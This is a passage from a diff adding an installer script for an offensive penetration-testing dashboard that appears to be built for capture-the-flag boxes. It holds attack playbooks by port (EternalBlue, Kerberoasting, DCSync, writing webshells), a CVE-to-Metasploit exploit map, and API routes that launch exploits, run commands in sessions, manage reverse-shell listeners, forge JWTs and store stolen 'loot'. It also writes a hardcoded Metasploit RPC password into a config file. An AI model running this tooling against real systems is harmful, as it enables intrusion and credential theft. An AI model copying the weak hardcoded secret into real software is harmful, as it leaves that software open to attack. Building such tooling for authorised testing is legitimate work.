+            "Check for EternalBlue (MS17-010) — port 445",
+            "Password spray against SMB",
+            "Pass-the-Hash if NTLM hash obtained",
+            "Relay attack with Responder + ntlmrelayx",
+        ],
+    },
+    "active_directory": {
+        "ports": {"88", "389", "636", "3268", "3269"},
+        "methodology": "Active Directory Attack Path",
+        "steps": [
+            "LDAP anonymous bind — enumerate users, computers, groups",
+            "AS-REP roasting (accounts with no preauth)",
+            "Kerberoasting (SPN accounts)",
+            "BloodHound data collection",
+            "Password spray with Kerbrute",
+            "Check for unconstrained/constrained delegation",
+            "ACL abuse (GenericAll, WriteDACL, ForceChangePassword)",
+            "DCSync if DCSyncable account found",
+            "PrintNightmare / ZeroLogon / noPac checks",
+        ],
+    },
+    "database": {
+        "ports": {"1433", "3306", "5432", "27017", "6379", "5984"},
+        "methodology": "Database Exploitation",
+        "steps": [
+            "Default credential login attempt",
+            "Version-specific CVE check",
+            "MySQL: UDF injection for RCE",
+            "MSSQL: xp_cmdshell for RCE",
+            "PostgreSQL: COPY TO/FROM for file read/RCE",
+            "Redis: unauthenticated access → cron/SSH key write",
+            "MongoDB: unauthenticated access",
+        ],
+    },
+    "ssh": {
+        "ports": {"22"},
+        "methodology": "SSH Exploitation",
+        "steps": [
+            "Version CVE check",
+            "Username enumeration (OpenSSH < 7.7)",
+            "Default/weak credential brute-force",
+            "Private key enumeration if web access available",
+            "After access: TTY upgrade, LinPEAS, sudo -l",
+        ],
+    },
+    "winrm": {
+        "ports": {"5985", "5986"},
+        "methodology": "WinRM Access",
+        "steps": [
+            "evil-winrm with credentials",
+            "Pass-the-Hash via WinRM",
+            "Upload and run WinPEAS",
+            "Check for stored credentials (cmdkey /list)",
+        ],
+    },
+    "ftp": {
+        "ports": {"21"},
+        "methodology": "FTP Exploitation",
+        "steps": [
+            "Anonymous FTP login attempt",
+            "Version CVE check (vsftpd backdoor, ProFTPD, etc.)",
+            "Credential brute-force",
+            "Upload webshell if FTP root is web root",
+        ],
+    },
+    "snmp": {
+        "ports": {"161", "162"},
+        "methodology": "SNMP Exploitation",
+        "steps": [
+            "Community string brute-force (public/private/manager)",
+            "SNMPwalk for full MIB dump",
+            "Extract user accounts, processes, installed software",
+            "Check for SNMP write community → config modification",
+        ],
+    },
+    "rdp": {
+        "ports": {"3389"},
+        "methodology": "RDP Exploitation",
+        "steps": [
+            "BlueKeep check (CVE-2019-0708) — unpatched Win7/2008",
+            "Credential brute-force / password spray",
+            "Screenshot attack (no auth) — check for lock screen info",
+            "Pass-the-Hash RDP with restricted admin mode",
+        ],
+    },
+}
+
+
+def suggest_methodology(open_ports: list, os_hint: str = "") -> dict:
+    open_set = {str(p) for p in open_ports}
+    os_lower = (os_hint or "").lower()
+    matched = []
+
+    for key, profile in PORT_PROFILES.items():
+        if profile["ports"] & open_set:
+            matched.append({
+                "profile": key,
+                "methodology": profile["methodology"],
+                "matched_ports": list(profile["ports"] & open_set),
+                "steps": profile["steps"],
+                "priority": len(profile["ports"] & open_set),
+            })
+
+    matched.sort(key=lambda x: -x["priority"])
+
+    # OS-specific hints
+    os_notes = []
+    if any(kw in os_lower for kw in ("windows", "iis", "microsoft")):
+        os_notes = ["Run WinPEAS after access", "Check AlwaysInstallElevated",
+                    "Check unquoted service paths", "Check SeImpersonatePrivilege (JuicyPotato/PrintSpoofer)"]
+    elif any(kw in os_lower for kw in ("linux", "ubuntu", "debian", "centos")):
+        os_notes = ["Run LinPEAS after access", "Check sudo -l",
+                    "Find SUID binaries", "Check capabilities (getcap -r /)"]
+
+    # Quick box type classification
+    box_type = "linux"
+    if any(kw in os_lower for kw in ("windows", "iis", "microsoft")):
+        box_type = "windows"
+    if {"88", "389", "636"} & open_set:
+        box_type = "ad"
+
+    return {
+        "box_type": box_type,
+        "os_hint": os_hint,
+        "open_ports": list(open_set),
+        "matched_profiles": matched,
+        "os_notes": os_notes,
+        "quick_wins": [s for m in matched[:2] for s in m["steps"][:3]],
+    }
+PY
+
+# ── CVE to Exploit Chain ──────────────────────────────────────────────────────
+cat > "$BASE/plugins/cve_exploit_chain.py" <<'PY'
+"""
+Links CVEs to Metasploit modules, searchsploit entries,
+and GitHub PoC repos. Builds an exploit chain recommendation.
+"""
+import logging
+import re
+import shutil
+import subprocess
+from typing import Optional
+
+import requests
+
+logger = logging.getLogger(__name__)
+
+# Expanded MSF module map
+MSF_CVE_MAP = {
+    "CVE-2017-0144":  {"module": "exploit/windows/smb/ms17_010_eternalblue",     "name": "EternalBlue"},
+    "CVE-2017-0145":  {"module": "exploit/windows/smb/ms17_010_eternalblue",     "name": "EternalBlue (WannaCry)"},
+    "CVE-2021-41773": {"module": "exploit/multi/http/apache_normalize_path_rce",  "name": "Apache Path Traversal RCE"},
+    "CVE-2021-42013": {"module": "exploit/multi/http/apache_normalize_path_rce",  "name": "Apache Path Traversal RCE v2"},
+    "CVE-2021-44228": {"module": "exploit/multi/misc/log4shell_header_injection",  "name": "Log4Shell"},
+    "CVE-2021-45046": {"module": "exploit/multi/misc/log4shell_header_injection",  "name": "Log4Shell v2"},
+    "CVE-2019-0708":  {"module": "exploit/windows/rdp/cve_2019_0708_bluekeep_rce","name": "BlueKeep"},
+    "CVE-2020-1472":  {"module": "exploit/windows/dcerpc/cve_2020_1472_zerologon","name": "ZeroLogon"},
+    "CVE-2021-34527": {"module": "exploit/windows/local/cve_2021_34527_printnightmare", "name": "PrintNightmare"},
+    "CVE-2014-6271":  {"module": "exploit/multi/http/apache_mod_cgi_bash_env_exec","name": "Shellshock"},
+    "CVE-2014-7169":  {"module": "exploit/multi/http/apache_mod_cgi_bash_env_exec","name": "Shellshock v2"},
+    "CVE-2018-7600":  {"module": "exploit/unix/webapp/drupal_drupalgeddon2",       "name": "Drupalgeddon2"},
+    "CVE-2018-7602":  {"module": "exploit/unix/webapp/drupal_restws_exec",         "name": "Drupal RCE"},
+    "CVE-2019-6340":  {"module": "exploit/unix/webapp/drupal_restws_exec",         "name": "Drupal REST RCE"},
+    "CVE-2012-1823":  {"module": "exploit/multi/http/php_cgi_arg_injection",       "name": "PHP CGI Arg Injection"},
+    "CVE-2017-5638":  {"module": "exploit/multi/http/struts2_content_type_ognl",   "name": "Struts2 RCE"},
+    "CVE-2018-11776": {"module": "exploit/multi/http/struts2_namespace_ognl",      "name": "Struts2 Namespace RCE"},
+    "CVE-2019-11510": {"module": "exploit/windows/http/pulse_secure_sslvpn_rce",   "name": "Pulse Secure VPN"},
+    "CVE-2020-5902":  {"module": "exploit/linux/http/f5_bigip_tmui_rce",           "name": "F5 BIG-IP RCE"},
+    "CVE-2021-26084": {"module": "exploit/multi/http/confluence_ognl_injection",   "name": "Confluence OGNL"},
+    "CVE-2022-26134": {"module": "exploit/multi/http/confluence_ognl_injection",   "name": "Confluence OGNL v2"},
+    "CVE-2022-22965": {"module": "exploit/multi/http/spring_framework_rce_spring4shell", "name": "Spring4Shell"},
+    "CVE-2023-23397": {"module": "exploit/windows/email/outlook_ntlm_theft",       "name": "Outlook NTLM Theft"},
+    "CVE-2023-44487": {"module": "",                                               "name": "HTTP/2 Rapid Reset (DoS)"},
+    "CVE-2021-3156":  {"module": "exploit/linux/local/sudo_baron_samedit",         "name": "Sudo Baron Samedit"},
+    "CVE-2021-4034":  {"module": "exploit/linux/local/cve_2021_4034_pwnkit_lpe",  "name": "PwnKit"},
+    "CVE-2022-0847":  {"module": "exploit/linux/local/cve_2022_0847_dirtypipe",   "name": "DirtyPipe"},
+    "CVE-2016-5195":  {"module": "exploit/linux/local/cve_2016_5195_dirtycow",    "name": "DirtyCow"},
+    "CVE-2019-7304":  {"module": "exploit/linux/local/snapd_dirty_socks",         "name": "Dirty_Socks (snapd)"},
+}
+
+
+def _searchsploit(cve_id: str) -> list:
+    if not shutil.which("searchsploit"):
+        return []
+    cve_id = re.sub(r"[^A-Za-z0-9\-]", "", cve_id)
+    try:
+        import json as _json
+        r = subprocess.run(["searchsploit", "--json", cve_id],
+                           capture_output=True, text=True, timeout=10, check=False)
+        data = _json.loads(r.stdout or "{}")
+        return [{"title": e.get("Title",""), "edb_id": e.get("EDB-ID",""),
+                 "path": e.get("Path","")} for e in data.get("RESULTS_EXPLOIT",[])[:5]]
+    except Exception:
+        return []
+
+
+def _poc_search_url(cve_id: str) -> str:
+    return f"https://github.com/search?q={cve_id}+poc&type=repositories&sort=stars"
+
+
+def chain_cves(cves: list) -> list:
+    """
+    For each CVE, look up MSF module, searchsploit, and PoC URL.
+    Returns sorted by exploitability.
+    """
+    results = []
+    for cve in cves:
+        cve_id  = cve.get("id", "")
+        severity= cve.get("severity", "UNKNOWN")
+        score   = cve.get("score", "N/A")
+        msf     = MSF_CVE_MAP.get(cve_id, {})
+        sploit  = _searchsploit(cve_id)
+
+        results.append({
+            "cve_id":    cve_id,
+            "severity":  severity,
+            "score":     score,
+            "name":      msf.get("name", cve.get("description", "")[:60]),
+            "msf_module":msf.get("module", ""),
+            "msf_ready": bool(msf.get("module")),
+            "searchsploit": sploit,
+            "poc_url":   _poc_search_url(cve_id),
+            "nvd_url":   f"https://nvd.nist.gov/vuln/detail/{cve_id}",
+            "exploitability": 3 if msf.get("module") else (2 if sploit else 1),
+        })
+
+    # Sort: MSF-ready first, then by CVSS score
+    sev_order = {"CRITICAL": 4, "HIGH": 3, "MEDIUM": 2, "LOW": 1, "UNKNOWN": 0}
+    results.sort(key=lambda x: (-x["exploitability"], -sev_order.get(x["severity"], 0)))
+    return results
+PY
+
+
+# ── All new API routes ────────────────────────────────────────────────────────
+cat >> "$BASE/dashboard/app.py" <<'PYROUTES_NEW'
+
+# ══════════════════════════════════════════════════════════════════════════════
+#  NEW ROUTES: Active Exploitation, Post-Exploitation, Web Testing, Intelligence
+# ══════════════════════════════════════════════════════════════════════════════
+
+from plugins.msf_rpc import (msf_status, list_modules, get_module_info,
+                              run_module, list_sessions, session_exec,
+                              list_jobs, kill_job)
+from plugins.shell_catcher import (start_listener, stop_listener,
+                                   send_to_shell, list_listeners,
+                                   get_listener_output, read_shell_log)
+from plugins.file_transfer import all_transfers, download_commands, http_server_commands
+from plugins.tty_upgrade import get_upgrade_sequence, all_upgrades
+from plugins.auto_linpeas import run_linpeas_ssh
+from plugins.privesc_checklist import get_checklist
+from plugins.loot_organizer import add_loot, get_loot, confirm_loot, delete_loot, loot_summary, LOOT_TYPES
+from plugins.ssti_scanner import scan_ssti
+from plugins.jwt_inspector import analyze_jwt, forge_with_secret, brute_secret
+from plugins.graphql_fuzzer import scan_graphql, detect_graphql, introspect
+from plugins.upload_bypass import test_upload
+from plugins.attack_narrative import generate_narrative
+from plugins.methodology_suggester import suggest_methodology
+from plugins.cve_exploit_chain import chain_cves
+
+
+# ── Request models ────────────────────────────────────────────────────────────
+
+class MsfRunRequest(BaseModel):
+    module_type: str = Field(default="exploit")
+    module_name: str = Field(..., min_length=1, max_length=200)
+    options: dict = Field(default_factory=dict)
+    payload: str = Field(default="")
+    payload_options: dict = Field(default_factory=dict)
+
+class SessionExecRequest(BaseModel):
+    command: str = Field(..., min_length=1, max_length=2000)
+
+class ListenerRequest(BaseModel):
+    port: int = Field(..., ge=1, le=65535)
+    host: str = Field(default="0.0.0.0")
+
+class ShellSendRequest(BaseModel):
+    command: str = Field(..., min_length=1, max_length=2000)
+
+class FileTransferRequest(BaseModel):
+    filename: str = Field(..., min_length=1, max_length=255)
+    port: int = Field(default=8080, ge=1, le=65535)
+    os_type: str = Field(default="linux")
+
+class LinpeasRequest(BaseModel):
+    host: str = Field(..., min_length=1, max_length=255)
+    username: str = Field(..., min_length=1, max_length=100)
+    password: str = Field(default="")
+    key_path: str = Field(default="")
+    port: int = Field(default=22, ge=1, le=65535)
+    os_type: str = Field(default="linux")
+
+class LootRequest(BaseModel):
+    loot_type: str = Field(..., min_length=1, max_length=50)
+    value: str = Field(..., min_length=1, max_length=5000)
+    scan_id: str = Field(default="")
+    box_name: str = Field(default="")
+    description: str = Field(default="", max_length=500)
+    source: str = Field(default="manual")
+    confirmed: bool = Field(default=False)
+
+class SstiRequest(BaseModel):
+    url: str = Field(..., min_length=1, max_length=2000)
+
+class JwtRequest(BaseModel):
+    token: str = Field(..., min_length=10, max_length=5000)
+    payload_overrides: dict = Field(default_factory=dict)
+    secret: str = Field(default="")
+
+class GraphqlRequest(BaseModel):
+    url: str = Field(..., min_length=1, max_length=2000)
+
+class UploadBypassRequest(BaseModel):
+    url: str = Field(..., min_length=1, max_length=2000)
+    field_name: str = Field(default="file")
+
+class NarrativeRequest(BaseModel):
+    box_name: str = Field(default="")
+    difficulty: str = Field(default="Medium")
+    extra_context: str = Field(default="", max_length=2000)
+
+class MethodologyRequest(BaseModel):
+    open_ports: List[int] = Field(default_factory=list)
+    os_hint: str = Field(default="")
+
+
+# ── Metasploit RPC ────────────────────────────────────────────────────────────
+
+@app.get("/msf/status")
+def msf_status_endpoint(user: dict = Depends(verify_token)) -> dict:
+    return msf_status()
+
+@app.get("/msf/modules/{module_type}")
+def msf_list_modules(module_type: str, search: str = Query(default=""),
+                     user: dict = Depends(verify_token)) -> dict:
+    return {"modules": list_modules(module_type, search), "type": module_type}
+
+@app.get("/msf/modules/{module_type}/{module_path:path}/info")
+def msf_module_info(module_type: str, module_path: str,
+                    user: dict = Depends(verify_token)) -> dict:
+    return get_module_info(module_type, module_path)
+
+@app.post("/msf/run")
+def msf_run(request: MsfRunRequest, user: dict = Depends(require_admin)) -> dict:
+    result = run_module(request.module_type, request.module_name,
+                        request.options, request.payload, request.payload_options)
+    log_event("", "msf_module_run", f"{request.module_name} → {result.get('status','?')}", actor=user["username"])
+    return result
+
+@app.get("/msf/sessions")
+def msf_sessions(user: dict = Depends(verify_token)) -> dict:
+    return {"sessions": list_sessions()}
+
+@app.post("/msf/sessions/{session_id}/exec")
+def msf_session_exec(session_id: str, request: SessionExecRequest,
+                     user: dict = Depends(verify_token)) -> dict:
+    output = session_exec(session_id, request.command)
+    return {"session_id": session_id, "command": request.command, "output": output}
+
+@app.get("/msf/jobs")
+def msf_list_jobs(user: dict = Depends(verify_token)) -> dict:
+    return {"jobs": list_jobs()}
+
+@app.delete("/msf/jobs/{job_id}")
+def msf_kill_job(job_id: str, user: dict = Depends(require_admin)) -> dict:
+    return {"killed": kill_job(job_id), "job_id": job_id}
+
+
+# ── Shell Catcher ─────────────────────────────────────────────────────────────
+
+@app.get("/listeners")
+def get_listeners(user: dict = Depends(verify_token)) -> dict:
+    return {"listeners": list_listeners()}
+
+@app.post("/listeners")
+def create_listener(request: ListenerRequest, user: dict = Depends(verify_token)) -> dict:
+    result = start_listener(request.port, request.host)
+    log_event("", "listener_started", f"Port {request.port}", actor=user["username"])
+    return result
+
+@app.delete("/listeners/{port}")
+def remove_listener(port: int, user: dict = Depends(verify_token)) -> dict:
+    return stop_listener(port)
+
+@app.post("/listeners/{port}/send")
+def send_command(port: int, request: ShellSendRequest,
+                 user: dict = Depends(verify_token)) -> dict:
+    return send_to_shell(port, request.command)
+
+@app.get("/listeners/{port}/output")
+def listener_output(port: int, user: dict = Depends(verify_token)) -> dict:
+    return {"port": port, "output": get_listener_output(port)}
+
+@app.get("/listeners/{port}/log")
+def listener_log(port: int, user: dict = Depends(verify_token)) -> dict:
+    return {"port": port, "log": read_shell_log(port)}
+
+
+# ── File Transfer + TTY ───────────────────────────────────────────────────────
+
+@app.post("/tools/file-transfer")
+def file_transfer(request: FileTransferRequest, user: dict = Depends(verify_token)) -> dict:
+    return all_transfers(request.filename, request.port)
+
+@app.get("/tools/tty-upgrade")
+def tty_upgrade(method: str = Query(default="python3"),
+                rows: int = Query(default=50), cols: int = Query(default=200),
+                user: dict = Depends(verify_token)) -> dict:
+    return {"method": method, "sequence": get_upgrade_sequence(method, rows, cols),
+            "all_methods": list(all_upgrades().keys())}
+
+
+# ── Post-Exploitation ─────────────────────────────────────────────────────────
+
+@app.post("/scans/{scan_id}/linpeas")
+def run_linpeas(scan_id: str, request: LinpeasRequest,
+                user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT id FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+    result = run_linpeas_ssh(request.host, request.username, request.password,
+                             request.key_path, request.port, os_type=request.os_type)
+    log_event(scan_id, "linpeas_run", f"Host: {request.host}, findings: {result.get('parsed',{}).get('summary',{}).get('total',0)}", actor=user["username"])
+    return result
+
+@app.get("/scans/{scan_id}/privesc")
+def privesc_checklist(scan_id: str, box_type: str = Query(default="linux"),
+                      user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT data FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+    data = json.loads(row["data"] or "{}")
+    open_ports = list(data.get("services", {}).keys())
+    return get_checklist(box_type, open_ports)
+
+@app.post("/loot")
+def add_loot_item(request: LootRequest, user: dict = Depends(verify_token)) -> dict:
+    loot_id = add_loot(request.loot_type, request.value, request.scan_id,
+                       request.box_name, request.description, request.source, request.confirmed)
+    return {"id": loot_id, "message": "Loot saved"}
+
+@app.get("/loot")
+def get_loot_items(scan_id: Optional[str] = Query(None), box_name: Optional[str] = Query(None),
+                   loot_type: Optional[str] = Query(None), confirmed_only: bool = Query(False),
+                   user: dict = Depends(verify_token)) -> dict:
+    items = get_loot(scan_id=scan_id, box_name=box_name, loot_type=loot_type, confirmed_only=confirmed_only)
+    return {"loot": items, "total": len(items), "types": LOOT_TYPES}
+
+@app.get("/loot/summary")
+def loot_summary_endpoint(scan_id: Optional[str] = Query(None),
+                           user: dict = Depends(verify_token)) -> dict:
+    return loot_summary(scan_id=scan_id)
+
+@app.put("/loot/{loot_id}/confirm")
+def confirm_loot_item(loot_id: int, confirmed: bool = True,
+                      user: dict = Depends(verify_token)) -> dict:
+    confirm_loot(loot_id, confirmed)
+    return {"id": loot_id, "confirmed": confirmed}
+
+@app.delete("/loot/{loot_id}")
+def delete_loot_item(loot_id: int, user: dict = Depends(verify_token)) -> dict:
+    delete_loot(loot_id)
+    return {"message": f"Loot {loot_id} deleted"}
+
+
+# ── Web Testing ───────────────────────────────────────────────────────────────
+
+@app.post("/scans/{scan_id}/ssti")
+def ssti_scan(scan_id: str, request: SstiRequest, user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT id FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+    result = scan_ssti(request.url)
+    log_event(scan_id, "ssti_scan", f"{result['finding_count']} finding(s) on {request.url}", actor=user["username"])
+    return result
+
+@app.post("/tools/jwt/analyze")
+def jwt_analyze(request: JwtRequest, user: dict = Depends(verify_token)) -> dict:
+    return analyze_jwt(request.token)
+
+@app.post("/tools/jwt/forge")
+def jwt_forge(request: JwtRequest, user: dict = Depends(verify_token)) -> dict:
+    if not request.secret:
+        raise HTTPException(status_code=400, detail="secret required for forging")
+    forged = forge_with_secret(request.token, request.secret, request.payload_overrides)
+    if not forged:
+        raise HTTPException(status_code=400, detail="Forge failed — check token and secret")
+    return {"forged_token": forged, "payload_overrides": request.payload_overrides}
+
+@app.post("/scans/{scan_id}/graphql")
+def graphql_scan(scan_id: str, request: GraphqlRequest, user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT id FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+    result = scan_graphql(request.url)
+    log_event(scan_id, "graphql_scan", f"Introspection: {result['introspection_enabled']}, findings: {len(result.get('fuzz_findings',[]))}", actor=user["username"])
+    return result
+
+@app.post("/tools/graphql/detect")
+def graphql_detect(request: GraphqlRequest, user: dict = Depends(verify_token)) -> dict:
+    return detect_graphql(request.url)
+
+@app.post("/scans/{scan_id}/upload-bypass")
+def upload_bypass(scan_id: str, request: UploadBypassRequest,
+                  user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT id FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+    result = test_upload(request.url, request.field_name)
+    log_event(scan_id, "upload_bypass", f"{result['finding_count']} bypass(es) on {request.url}", actor=user["username"])
+    return result
+
+
+# ── Intelligence ──────────────────────────────────────────────────────────────
+
+@app.post("/scans/{scan_id}/narrative")
+def attack_narrative(scan_id: str, request: NarrativeRequest,
+                     user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT id FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+    result = generate_narrative(scan_id, request.box_name, request.difficulty, request.extra_context)
+    log_event(scan_id, "narrative_generated", f"Box: {request.box_name}", actor=user["username"])
+    return result
+
+@app.post("/scans/{scan_id}/methodology")
+def scan_methodology(scan_id: str, request: MethodologyRequest,
+                     user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT data, os_hint FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+    data = json.loads(row["data"] or "{}")
+    ports = request.open_ports or list(data.get("services", {}).keys())
+    os_hint = request.os_hint or (row["os_hint"] or "")
+    return suggest_methodology(ports, os_hint)
+
+@app.post("/scans/{scan_id}/exploit-chain")
+def exploit_chain(scan_id: str, user: dict = Depends(verify_token)) -> dict:
+    with closing(get_db()) as db:
+        row = db.execute("SELECT data FROM scans WHERE id=?", (scan_id,)).fetchone()
+        if not row:
+            raise HTTPException(status_code=404, detail="Scan not found")
+    data = json.loads(row["data"] or "{}")
+    all_cves = [cve for port_cves in data.get("cves", {}).values() for cve in port_cves]
+    chained = chain_cves(all_cves)
+    return {"scan_id": scan_id, "exploit_chain": chained, "total": len(chained),
+            "msf_ready": sum(1 for c in chained if c["msf_ready"])}
+PYROUTES_NEW
+
+# ── Update .env with new config keys ─────────────────────────────────────────
+cat >> "$BASE/.env" <<'NEWENV'
+MSF_HOST=127.0.0.1
+MSF_PORT=55553
+MSF_PASS=msf123
+MSF_SSL=false
+LHOST=
+NEWENV
+
+# ── Update pip install for new deps ──────────────────────────────────────────
+python3 -m pip install pymetasploit3 python-jose 2>/dev/null || \
+  warn "pymetasploit3 install failed — MSF RPC will be unavailable until installed"
+
+log "OK" "════════════════════════════════════════════════════════"
+log "OK" "All new features deployed:"
+log "OK" ""
+log "OK" "  ── ACTIVE EXPLOITATION ──"
+log "OK" "  ✓ plugins/msf_rpc.py          — Metasploit RPC (list modules, run exploits, manage sessions)"
+log "OK" "  ✓ plugins/shell_catcher.py    — Reverse shell listener manager (start/stop/send/log)"
+log "OK" "  ✓ plugins/file_transfer.py    — File transfer one-liner generator (HTTP/SMB/FTP/base64/certutil)"
+log "OK" "  ✓ plugins/tty_upgrade.py      — TTY upgrade sequences (python3/script/socat/rlwrap)"
+log "OK" ""
+log "OK" "  ── POST-EXPLOITATION ──"
+log "OK" "  ✓ plugins/auto_linpeas.py     — Auto upload+run+parse LinPEAS/WinPEAS via SSH"
+log "OK" "  ✓ plugins/privesc_checklist.py — Port-aware privesc checklist (Linux/Windows/AD)"
+log "OK" "  ✓ plugins/loot_organizer.py   — Structured loot store (flags, hashes, keys, tokens)"
+log "OK" ""
+log "OK" "  ── WEB TESTING ──"
+log "OK" "  ✓ plugins/ssti_scanner.py     — SSTI scanner (Jinja2/Twig/Smarty/FreeMarker/ERB/Velocity)"
+log "OK" "  ✓ plugins/jwt_inspector.py    — JWT decoder, alg:none, weak secret brute-force, forger"
+log "OK" "  ✓ plugins/graphql_fuzzer.py   — GraphQL introspection + injection fuzzer"
+log "OK" "  ✓ plugins/upload_bypass.py    — File upload bypass (MIME/ext/magic bytes/polyglot/null byte)"
+log "OK" ""
+log "OK" "  ── INTELLIGENCE ──"
+log "OK" "  ✓ plugins/attack_narrative.py — Ollama attack path narrative generator"
+log "OK" "  ✓ plugins/methodology_suggester.py — Port-based methodology suggester (10 profiles)"
+log "OK" "  ✓ plugins/cve_exploit_chain.py — CVE→MSF module linker + searchsploit + PoC URLs"
+log "OK" ""
+log "OK" "  ── NEW API ENDPOINTS ──"
+log "OK" "  ✓ GET  /msf/status                         — MSF RPC connection status"
+log "OK" "  ✓ GET  /msf/modules/{type}                 — List/search MSF modules"
+log "OK" "  ✓ POST /msf/run                            — Launch MSF module (admin)"
+log "OK" "  ✓ GET  /msf/sessions                       — List active Meterpreter sessions"
+log "OK" "  ✓ POST /msf/sessions/{id}/exec             — Execute command in session"
+log "OK" "  ✓ GET  /listeners                          — List active shell listeners"
+log "OK" "  ✓ POST /listeners                          — Start new reverse shell listener"
+log "OK" "  ✓ DELETE /listeners/{port}                 — Stop listener"
+log "OK" "  ✓ POST /listeners/{port}/send              — Send command to shell"
+log "OK" "  ✓ GET  /listeners/{port}/output            — Get shell output"
+log "OK" "  ✓ POST /tools/file-transfer                — Generate file transfer one-liners"
+log "OK" "  ✓ GET  /tools/tty-upgrade                  — Get TTY upgrade sequence"
+log "OK" "  ✓ POST /scans/{id}/linpeas                 — Auto-run LinPEAS via SSH"
+log "OK" "  ✓ GET  /scans/{id}/privesc                 — Port-aware privesc checklist"
+log "OK" "  ✓ POST /loot                               — Save loot item"
+log "OK" "  ✓ GET  /loot                               — Query loot store"
+log "OK" "  ✓ GET  /loot/summary                       — Loot summary by type"
+log "OK" "  ✓ POST /scans/{id}/ssti                    — SSTI scan"
+log "OK" "  ✓ POST /tools/jwt/analyze                  — JWT decode + weakness analysis"
+log "OK" "  ✓ POST /tools/jwt/forge                    — JWT forger with payload overrides"
+log "OK" "  ✓ POST /scans/{id}/graphql                 — GraphQL introspect + fuzz"
+log "OK" "  ✓ POST /tools/graphql/detect               — Detect GraphQL endpoint"
+log "OK" "  ✓ POST /scans/{id}/upload-bypass           — File upload bypass test"
+log "OK" "  ✓ POST /scans/{id}/narrative               — Generate Ollama attack narrative"
+log "OK" "  ✓ POST /scans/{id}/methodology             — Suggest attack methodology from ports"
+log "OK" "  ✓ POST /scans/{id}/exploit-chain           — CVE→exploit chain with MSF modules"
+log "OK" "════════════════════════════════════════════════════════"
+warn "MSF RPC: start with — msfconsole -x 'load msgrpc Pass=msf123 SSL=false'"
+warn "LinPEAS auto-run requires SSH credentials — set after initial access"
+warn "Ollama narrative requires Ollama running — ollama pull llama3"
+warn "Set LHOST in $BASE/.env to your attacker IP for file transfer helpers"
